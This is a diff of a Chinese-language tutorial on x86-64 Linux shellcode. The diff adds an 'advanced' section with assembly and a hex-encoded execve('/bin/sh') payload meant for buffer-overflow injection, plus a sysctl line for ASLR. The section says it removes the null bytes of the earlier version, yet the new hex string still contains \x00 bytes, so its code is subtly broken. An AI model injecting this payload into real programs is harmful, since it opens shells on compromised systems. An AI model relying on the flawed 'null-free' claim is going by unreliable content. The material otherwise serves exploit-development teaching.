@@ -92,7 +92,7 @@ lea -0x20(%rbp), %rsi #这是execve第二个参数，它需要**类型，所以�
 mov -0x20(%rbp), %rdi #mov将字符串传给rdi，这是execve第一个参数。
 mov $59, %rax #这个59是execve的系统调用号，在/usr/include/asm/unistd_64.h里可以查询到.
 syscall #系统调用， 这个可以取代 int 0x80
-cl: call pp
+c1: call pp
 
 .ascii "/bin/sh"
 ```
@@ -154,6 +154,43 @@ gcc shellcodeTest.c -o shellcodeTest -fno-stack-protector -z execstack
 ity$ ./shellcodeTest 
 $ whoami
 channy
+```
+
+## 7. 进阶
+
+上面一段shellcode并不适用于缓冲区溢出，因为中间好多\x00啦～
+
+> 还有一个注意的是0x20，这个在ascii里代表的是空，也会造成输入中断，输入函数返回。
+
+```
+.section .text
+.global _start
+_start:
+jmp c1
+pp: popq %rcx 
+pushq %rbp 
+mov %rsp, %rbp
+subq $0x30, %rsp
+movq %rcx, -0x20(%rbp) 
+xorq %rax, %rax
+movq %rax,-0x18(%rbp)
+movq %rax, %rdx
+lea -0x20(%rbp), %rsi
+mov -0x20(%rbp), %rdi
+mov $59, %rax
+syscall 
+c1: call pp
+
+.ascii "/bin/sh"
+```
+
+```
+\xeb\x28\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\x31\xc0\x48\x89\x45\xe8\x48\x89\xc2\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+```
+
+//0: disable, 1: enable, 2: default
+```
+sysctl -w kernel.randomize_va_space=2
 ```
 
 [back](/)
